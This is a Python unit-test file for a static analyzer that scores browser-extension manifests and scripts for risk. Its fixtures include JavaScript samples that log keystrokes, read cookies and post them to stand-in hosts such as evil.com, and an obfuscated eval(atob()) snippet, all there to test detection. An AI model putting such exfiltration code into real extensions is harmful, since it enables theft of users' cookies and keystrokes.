"""
C1 Unit Tests — Static Extension Analyzer
Run from project root:  python Test/C1/test_c1_units.py
"""
import sys
import os
import json
import unittest

_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from core.c1.features import extract_manifest_features, _shannon_entropy


# ── Fixtures ──────────────────────────────────────────────────────────────────
BENIGN_MANIFEST = {
    "name": "Simple Extension",
    "version": "1.0",
    "manifest_version": 3,
    "permissions": ["storage"],
}

MALICIOUS_MANIFEST = {
    "name": "Evil Extension",
    "version": "1.0",
    "manifest_version": 3,
    "permissions": [
        "webRequest", "cookies", "tabs", "history",
        "downloads", "nativeMessaging", "clipboardRead",
    ],
    "host_permissions": ["<all_urls>"],
    "background": {"service_worker": "background.js"},
    "content_scripts": [{"matches": ["<all_urls>"], "js": ["inject.js"]}],
    "web_accessible_resources": [{"resources": ["*"], "matches": ["<all_urls>"]}],
}

MALICIOUS_CODE = """
var _0x1234 = atob('aGVsbG8=');
eval(Function('return this')());
var x = new XMLHttpRequest();
x.open('POST', 'https://evil.com/exfil');
document.addEventListener('keydown', function(e) { steal(e.key); });
document.cookie;
chrome.cookies.getAll({}, function(c) { fetch('https://evil.com/c', {method:'POST', body: JSON.stringify(c)}); });
""" + ("A" * 120)  # long base64-like string


# ── Tests ──────────────────────────────────────────────────────────────────────
class TestShannonEntropy(unittest.TestCase):
    def test_empty_string_is_zero(self):
        self.assertEqual(_shannon_entropy(""), 0.0)

    def test_uniform_string_max_entropy(self):
        # "ab" repeated has entropy = 1.0
        self.assertAlmostEqual(_shannon_entropy("ababab"), 1.0, places=5)

    def test_single_char_is_zero(self):
        self.assertEqual(_shannon_entropy("aaaa"), 0.0)

    def test_higher_diversity_higher_entropy(self):
        low = _shannon_entropy("aaab")
        high = _shannon_entropy("abcd")
        self.assertGreater(high, low)


class TestManifestFeatures(unittest.TestCase):
    def test_benign_manifest_low_risk_features(self):
        feats = extract_manifest_features(BENIGN_MANIFEST, "")
        self.assertEqual(feats["has_webRequest"], 0.0)
        self.assertEqual(feats["has_all_urls"], 0.0)
        self.assertEqual(feats["has_cookies"], 0.0)
        self.assertEqual(feats["has_nativeMessaging"], 0.0)
        self.assertEqual(feats["has_background_script"], 0.0)
        self.assertEqual(feats["has_storage"], 1.0)
        self.assertEqual(feats["total_permission_count"], 1.0)

    def test_malicious_manifest_high_risk_features(self):
        feats = extract_manifest_features(MALICIOUS_MANIFEST, "")
        self.assertEqual(feats["has_webRequest"], 1.0)
        self.assertEqual(feats["has_all_urls"], 1.0)
        self.assertEqual(feats["has_cookies"], 1.0)
        self.assertEqual(feats["has_tabs"], 1.0)
        self.assertEqual(feats["has_history"], 1.0)
        self.assertEqual(feats["has_nativeMessaging"], 1.0)
        self.assertEqual(feats["has_background_script"], 1.0)
        self.assertEqual(feats["has_content_scripts"], 1.0)
        self.assertEqual(feats["web_accessible_resources"], 1.0)

    def test_host_permission_count(self):
        feats = extract_manifest_features(MALICIOUS_MANIFEST, "")
        self.assertEqual(feats["host_permission_count"], 1.0)

    def test_code_features_detected_in_malicious_code(self):
        feats = extract_manifest_features(MALICIOUS_MANIFEST, MALICIOUS_CODE)
        # Should detect eval, atob, XHR/fetch, keydown, cookie access
        self.assertGreater(feats.get("eval_count", 0.0), 0.0,
                           "eval() not detected in malicious code")
        self.assertGreater(feats.get("atob_count", 0.0), 0.0,
                           "atob() not detected in malicious code")
        self.assertGreater(feats.get("xhr_fetch_count", 0.0), 0.0,
                           "XMLHttpRequest not detected in malicious code")
        self.assertEqual(feats.get("keydown_listener", 0.0), 1.0,
                         "keydown listener not detected")
        self.assertGreater(feats.get("cookie_in_code", 0.0), 0.0,
                           "cookie access not detected")

    def test_benign_code_no_malicious_signals(self):
        code = "chrome.storage.local.get('key', function(v) { console.log(v); });"
        feats = extract_manifest_features(BENIGN_MANIFEST, code)
        self.assertEqual(feats.get("eval_count", 0.0), 0.0)
        self.assertEqual(feats.get("atob_count", 0.0), 0.0)
        self.assertEqual(feats.get("keydown_listener", 0.0), 0.0)

    def test_external_urls_counted(self):
        code = "fetch('https://attacker.com/data'); fetch('https://evil.org/cmd');"
        feats = extract_manifest_features(BENIGN_MANIFEST, code)
        self.assertGreaterEqual(feats.get("external_url_count", 0), 2)

    def test_content_script_entropy_increases_with_obfuscation(self):
        clean_code = "console.log('hello world');"
        # High-entropy obfuscated JS: mixed hex escapes + base64-like payload
        obfuscated = (
            "var _0x1a2b=['\\x68\\x65\\x6c\\x6c\\x6f','\\x77\\x6f\\x72\\x6c\\x64'];"
            "function _0xAB3f(_0x1,_0x2){return _0x1a2b[_0x1-0xC8]||_0x2;}"
            "eval(atob('dmFyIGE9MSxi'+'PTE7Y29uc29sZS5sb2coYSti'+'KTs='));"
            "var _$_=function(_0xAf,_0xBe){return _0xAf^_0xBe>>>0x3|_0x1a2b.length};"
            "setTimeout(function(){_$_(0x41,0x3F);},0x1388+Math.random()*0xFF);"
        )
        feats_clean = extract_manifest_features(BENIGN_MANIFEST, clean_code)
        feats_obf = extract_manifest_features(BENIGN_MANIFEST, obfuscated)
        self.assertGreater(
            feats_obf["content_script_entropy"],
            feats_clean["content_script_entropy"],
        )


class TestManifestV2Compatibility(unittest.TestCase):
    """Manifest v2 extensions should still be parsed correctly."""

    def test_mv2_background_page(self):
        manifest = {
            "manifest_version": 2,
            "permissions": ["webRequest", "webRequestBlocking", "<all_urls>"],
            "background": {"scripts": ["bg.js"], "persistent": True},
        }
        feats = extract_manifest_features(manifest, "")
        self.assertEqual(feats["has_webRequest"], 1.0)
        self.assertEqual(feats["has_background_script"], 1.0)

    def test_empty_manifest_returns_zero_features(self):
        feats = extract_manifest_features({}, "")
        self.assertEqual(feats["has_webRequest"], 0.0)
        self.assertEqual(feats["total_permission_count"], 0.0)


if __name__ == "__main__":
    print("\n=== C1 Unit Tests ===\n")
    unittest.main(verbosity=2)
